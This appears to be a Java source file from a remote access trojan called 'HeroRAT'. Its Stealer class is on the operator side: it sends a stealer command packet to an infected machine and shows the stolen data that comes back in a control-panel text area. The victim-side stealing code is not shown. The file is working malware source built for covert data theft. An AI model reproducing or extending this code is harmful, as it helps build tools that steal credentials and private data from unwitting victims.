package net.herorat.features.stealer;

import net.herorat.Main;
import net.herorat.features.servers.Server;
import net.herorat.network.Network;
import net.herorat.network.Packet;
import net.herorat.network.Packet11Stealer;


public class Stealer
{
	public static void send(Server server)
	{
		Packet p = new Packet11Stealer(server.outputstream, new String[] { });
		p.write();
	}

	public static void handle(Server server, String[] args)
	{
		if (!server.equals(Network.findWithCombo(Main.mainWindow.panel_tab10.combo_selected_item))) return;
		
		StringBuffer buffer = new StringBuffer();
		for (String arg : args)
		{
			buffer.append(arg);
		}
		
		Main.mainWindow.panel_tab10.area_output.setText(buffer.toString());
	}
}